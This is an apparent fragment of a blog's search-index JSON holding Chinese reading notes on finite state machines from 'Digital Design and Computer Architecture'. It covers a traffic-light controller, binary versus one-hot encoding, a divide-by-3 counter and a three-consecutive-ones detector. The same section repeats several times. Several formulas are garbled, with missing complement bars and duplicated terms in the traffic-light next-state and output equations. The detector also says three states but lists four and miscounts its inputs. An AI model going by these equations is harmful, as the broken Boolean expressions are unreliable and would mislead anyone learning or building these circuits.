S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#状态转换图绘制-1"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#状态转换表绘制"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#二进制编码实现"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 3.4.1.10 步骤十：画出电路图 设计寄存器 状态寄存器设计如图，左边是下一时刻状态，右边是之前的状态。在时钟上升沿，下一时刻状态打入寄存器，因此将其花在左边，而不是右边。 添加状态与输入关系电路 添加状态与输出关系电路 3.4.2 3.4.2 State Encodings 状态编码有分为二进制编码（binary encoding）和独热编码（One-hot encoding） 3.4.2.1 Binary EncodingN 个编码只需要$log_{2}N$位就可以表示。 3.4.2.2 One-hot EncodingN 个编码需要 N 位二进制表示，该二进制数中，对于一个状态有且仅有 1 位的值为 1。选择这种编码需要更多的触发器，但是对应的输出电路和状态转换电路会更简单。 3.4.2.3 设计示例1：3进制计数器设计一个 divide by 3 counter，当状态转换的次数为3的倍数时（对3求模 = 0），输出为1，否则输出为0 3.4.2.3.1 背景分析根据分析，电路存在3个状态： S0：初始状态，也是最终状态，输出为1。下一时刻跳转到S1 S1：输出为0，下一时刻跳转到S2 S2：输出为0，下一时刻跳转到S0 电路状态转换图如下： 3.4.2.3.2 状态转换图绘制 状态有3个，S0、S1和S2，我们分别采用二进制编码和独热编码对其进行编码。 3.4.2.3.3 采用二进制编码设计 状态编码：电路有3个状态，我们采用2位二进制进行编码，分别用$S_{1}$和$S_{0}$表示。 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 输出编码：电路只有1个输出，也就是Y，那么我们只需要1位二进制数表示 状态转换表 状态 $S_{1}$ $S_{0}$ 下一状态 $S_{1}'$ $S_{0}'$ S0 0 0 S1 0 1 S1 0 1 S2 1 0 S2 1 0 S0 0 0 由图我们可以得到状态表达式，下一时刻的状态用$S’$表示。 $$ S_{1}’ = \\bar{S_{1}}S_{0} $$ $$ S_{0}’ = \\bar{S_{1}}\\bar{S_{0}} $$ 状态与输出关系表 状态 $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 S1 0 1 0 S2 1 0 0 由图我们可以得到输出与状态的关系式： $$ Y=\\bar{S_{1}}\\bar{S_{0}} $$ 电路图设计 3.4.2.3.4 采用独热编码设计 状态编码：独热编码对每个状态使用1位单独的二进制1，因此3个状态需要3位二进制数。 状态 $S_{2}$ $S_{1}$ $S_{0}$ S0 0 0 1 S1 0 1 0 S2 1 0 0 输出编码：电路只有1个输出，也就是Y，使用1位二进制数表示 状态转换表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 下一时刻状态 $S_{2}'$ $S_{1}'$ $S_{0}'$ S0 0 0 1 S1 0 1 0 S1 0 1 0 S2 1 0 0 S2 1 0 0 S0 0 0 1 由图我们可以得到状态表达式： $$ S_{1}’ = S{0} $$ $$ S_{2}’ = S{1} $$ $$ S_{0}’ = S{2} $$ 状态与输出关系表 状态 $S_{2}$ $S_{1}$ $S_{0}$ 输出Y S0 0 0 1 1 S1 0 1 0 0 S2 1 0 0 0 由此我们可以得到状态与输出表达式：$Y=S_{0}$ 电路设计 通过上面的分析，我们可以看到，独热编码的逻辑表达式比二进制编码要简单很多，但是会更加消耗二进制位数。电路设计如下： 3.4.2.4 设计示例2：3进制累加器设计一个累加器，当连续输入3个1时，输出为1，其他时候输出为0。 3.4.2.4.1 背景分析根据分析，电路存在3个状态： S0：起始（复位）状态，输入0个3时，输出为0。若此时输入1，进入S1；否则继续S0 S1：输入1个3时，输出为0。若此时输入1，进入S2；否则进入S0 S2：输入2个3时，输出为0。若此时输入1，进入S3；否则进入S0 S3：输入3个3时，输出为1。下一状态为S0 3.4.2.4.2 状态转换图绘制 3.4.2.4.3 状态转换表绘制 状态 $S_{1}$ $S_{0}$ 输入T 下一时刻状态 $S_{1}'$ $S_{0}'$ 输出 S0 0 0 0 S0 0 0 0 S0 0 0 1 S1 0 1 0 S1 0 1 0 S0 0 0 0 S1 0 1 1 S2 1 0 0 S2 1 0 0 S0 0 0 0 S2 1 0 1 S3 1 1 0 S3 1 1 X S0 0 0 1 3.4.2.4.4 二进制编码实现 状态编码：状态有4个，因此使用2位二进制数进行编码 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 输入编码：输入只有1个，因此","date":"2024-05-01","objectID":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/:3:4","series":null,"tags":["计算机组成原理"],"title":"\u003cDigital Design and Computer Architecture\u003e MIPS 版本 阅读笔记","uri":"/ddca%E9%98%85%E8%AF%BB%E7%AC%94%E8%AE%B0/#343-moore-and-mealy-machines"},{"categories":["计算机体系结构"],"content":" 3.4 3.4 Finite State Machines时序逻辑电路可以被表示成有限状态机的形式，它通常有如下几个组成部分： M 个输入 N 个输出 k 位的状态（因此电路一共可以有$2^{k}$个状态） 一个时钟 时序逻辑电路又分两种： Moore 型电路：电路的状态由电路之前的状态和组合逻辑函数决定 Mealy 型电路：电路的状态由之前的状态，电路的输入，和组合逻辑函数决定 3.4.1 3.4.1 FSM Design Example 下面通过一个设计十字路口交通灯的案例，来演示时序逻辑电路的设计。 3.4.1.1 步骤一：明确问题背景 十字路口有两个传感器：$T_{A}$和$T_{B}$，当传感器输出为True代表有学生，输出为False代表道路空 两个交通灯：$L_{A}$和$L_{B}$，每个交通灯都要接受传感器的数据，然后决定是输出红，绿，还是黄 每个交通灯有 5 秒的间隔，交通灯在时钟上升沿通过传感器的输入，更新自己的状态 控制器还有一个 reset 按钮来实现复位 交通灯概念图设计如下： 交通灯接口设计如下： 3.4.1.2 步骤二：绘制状态转换图电路状态转换过程分析如下： 状态的初始值（复位状态）如下：A 路绿，B 路红 如果$T_{A}$为True，那么 A 路持续绿，B 路持续红；否则，A 路进入黄色，B 路红 A 路黄，B 路红时，我们无需管$T_{A}$的状态。过 5 秒自动切入下一个状态：A 路红，B 路绿 A 路红，B 路绿时，如果$T_{B}$为True，那么 A 路持续红，B 路持续绿；否则，A 路红，B 路进入黄色 A 路红，B 路进入黄色时，我们无需管$T_{B}$的状态，过 5 秒后回到初始状态，A 路绿，B 路红 根据以上分析，电路可以划分为以下几个状态： A 路绿，B 路红：$T_{A}$为True时保持，否则进入状态 2 A 路黄，B 路红：5 秒后进入状态 3 A 路红，B 路绿：$T_{B}$为True时保持，否则进入状态 4 A 路红，B 路黄：5 秒后进入状态 1 电路转换的时机是时钟上升沿 3.4.1.3 步骤三：绘制状态转换表我们将状态转换图，转化为状态转换表。在绘制过程中，我们需要明确如下几样： 状态表示：这里我们用 S0，S1，S2，S3 来表示 状态转换输入：用$T_{A}$，$T_{B}$来表示，使用 X 来表示无关项（类似卡诺图） 状态转换表的每行有 3 项： 该状态 输入 下一状态 绘制状态转换表如下： 当前状态 输入$T_{A}$ 输入$T_{B}$ 下一状态 S0 0 X S1 S0 1 X S0 S1 X X S2 S2 X 0 S3 S2 X 1 S2 S3 X X S0 3.4.1.4 步骤四：对状态进行二进制编码状态分为：S0，S1，S2，S3 状态 $S_{1}$ $S_{0}$ S0 0 0 S1 0 1 S2 1 0 S3 1 1 3.4.1.5 步骤五：对输出进行二进制编码输出分为：红、黄、绿 输出 $L_{1}$ $L_{0}$ 绿 0 0 黄 0 1 红 1 0 3.4.1.6 步骤六：确定状态与输入关系表（将状态编码嵌入到状态转换表） 当前状态 $S_{1}$ $S_{0}$ 输入$T_{A}$ 输入$T_{B}$ 下一状态 $S_{1}$ $S_{0}$ S0 0 0 0 X S1 0 1 S0 0 0 1 X S0 0 0 S1 0 1 X X S2 1 0 S2 1 0 X 0 S3 1 1 S2 1 0 X 1 S2 1 0 S3 1 1 X X S0 0 0 3.4.1.7 步骤七：确定状态与输出的关系表（根据电路分析、状态编码和输出编码） 状态 $S_{1}$ $S_{0}$ $L_{A1}$ $L_{A0}$ $L_{B1}$ $L_{B0}$ S0 0 0 0 0 1 0 S1 0 1 0 1 1 0 S2 1 0 1 0 0 0 S3 1 1 1 0 0 1 3.4.1.8 步骤八：写出状态表达式我们使用$S’$来表示下一时刻的状态，可以如下表示： $$ S_{1}’ = S_{1}S_{0} +S_{1}S_{0}T_{B} +S_{1}S_{0}T_{B} $$ $$ S_{0}’ = S_{1}S_{0}T_{A}+S_{1}S_{0}T_{B} $$ 3.4.1.9 步骤九：写出输出表达式$$ L_{A1} = S_{1}L_{A0} = S_{1}S_{0} $$ $$ L_{B1} = S_{1}L_{B0} = S_{1}S_{0} $$ 